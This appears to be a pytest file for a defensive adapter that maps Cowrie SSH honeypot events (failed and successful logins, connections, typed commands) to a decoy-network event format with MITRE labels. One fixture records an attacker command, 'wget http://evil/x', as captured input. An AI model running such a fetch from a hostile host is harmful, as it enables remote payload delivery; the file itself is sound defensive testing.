"""Tests for the Cowrie → Mirage Mesh event mapping (network decoy)."""
from cowrie_adapter import _process_line, _safe_port, map_cowrie_event


def test_map_login_failed_credentials():
    raw = {
        "eventid": "cowrie.login.failed",
        "username": "root",
        "password": "hunter2",
        "src_ip": "203.0.113.4",
        "src_port": 51022,
        "session": "a1b2",
        "timestamp": "2026-07-17T00:00:00Z",
    }
    kwargs = map_cowrie_event(raw)
    assert kwargs["event_action"] == "ssh_login_failed"
    assert kwargs["source_ip"] == "203.0.113.4"
    assert kwargs["source_port"] == 51022
    assert kwargs["kill_chain_stage"] == "credential_access"
    assert kwargs["mitre_techniques"] == ["T1110"]
    assert kwargs["details"]["username"] == "root"
    assert kwargs["details"]["password"] == "hunter2"
    assert kwargs["timestamp"] == "2026-07-17T00:00:00Z"


def test_connect_is_medium_severity_recon():
    kwargs = map_cowrie_event(
        {"eventid": "cowrie.session.connect", "src_ip": "198.51.100.7", "src_port": 40001}
    )
    assert kwargs["severity"] == "medium"
    assert kwargs["kill_chain_stage"] == "reconnaissance"


def test_login_success_is_critical():
    kwargs = map_cowrie_event(
        {"eventid": "cowrie.login.success", "username": "admin", "src_ip": "203.0.113.4"}
    )
    assert kwargs["severity"] == "critical"
    assert kwargs["mitre_techniques"] == ["T1078"]


def test_command_input_captured_in_details():
    kwargs = map_cowrie_event(
        {"eventid": "cowrie.command.input", "input": "wget http://evil/x", "src_ip": "1.1.1.1"}
    )
    assert kwargs["severity"] == "critical"
    assert kwargs["details"]["input"] == "wget http://evil/x"


def test_uninteresting_events_are_skipped():
    assert map_cowrie_event({"eventid": "cowrie.session.closed"}) is None
    assert map_cowrie_event({"eventid": "cowrie.client.version", "version": "x"}) is None


def test_non_dict_input_is_skipped():
    assert map_cowrie_event(["not", "a", "dict"]) is None


def test_safe_port_rejects_bad_values():
    assert _safe_port("51022") == 51022
    assert _safe_port(None) is None
    assert _safe_port(70000) is None
    assert _safe_port("abc") is None


def test_process_line_emits_mapped_event():
    captured = []

    class FakeEmitter:
        def emit(self, **kwargs):
            captured.append(kwargs)

    _process_line(
        '{"eventid":"cowrie.login.success","username":"root","src_ip":"9.9.9.9"}',
        FakeEmitter(),
    )
    assert captured and captured[0]["event_action"] == "ssh_login_success"


def test_process_line_ignores_partial_json_line():
    class ExplodingEmitter:
        def emit(self, **kwargs):
            raise AssertionError("must not emit on malformed input")

    # A partial line written during rotation must not raise or emit.
    _process_line('{"eventid":"cowrie.login', ExplodingEmitter())
